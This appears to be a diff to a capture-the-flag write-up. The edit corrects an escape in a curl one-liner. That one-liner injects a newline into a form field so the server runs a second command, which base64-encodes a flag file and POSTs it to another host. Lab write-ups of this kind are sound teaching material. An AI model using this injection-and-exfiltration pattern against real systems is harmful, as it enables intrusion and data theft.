@@ -886,7 +886,7 @@ By checking the exposed `dir.txt` file and decode the base64 string, I see the r
 With another payload I can read the flag:
 
 ```bash
-curl -s -X POST -d 'word=%0Acurl -X POST -d "$(ca\\t /flagljChD | base64 -w 0)" http://1.3.3.6/images/recv.php' http://1.3.3.7/
+curl -s -X POST -d 'word=%0Acurl -X POST -d "$(ca\t /flagljChD | base64 -w 0)" http://1.3.3.6/images/recv.php' http://1.3.3.7/
 ```
 
 ## Loot & Flags
